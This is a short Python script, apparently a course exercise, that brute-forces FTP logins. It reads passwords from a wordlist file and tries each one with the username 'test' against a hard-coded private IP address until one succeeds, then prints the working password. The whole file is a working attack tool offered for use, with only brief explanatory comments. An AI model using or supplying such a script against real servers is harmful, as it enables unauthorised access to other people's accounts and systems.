#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/24 17:55 
# @Author   : ordar
# @File     : ftp_brute.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
from ftplib import FTP


def get_pass(host, user, passwd):
    try:
        # 连接FTP Connection到服务器PC，参数为IP或域名。
        ftp = FTP(host)
        # 使用函数参数给出的密码与已知用户名尝试登录。
        # 若登录正常，则执行下一条语句，否则触发异常。
        ftp.login(user, passwd)
        print("[+] User {} Password is {}".format(user, passwd))
        return True
    except:
        return False


with open("wordlist.txt", 'r') as f:
    all_passwd = f.readlines()

for passwd in all_passwd:
    passwd = passwd.strip()
    print("[-] Test password {}".format(passwd))
    if get_pass("172.28.131.166", "test", passwd):
        break
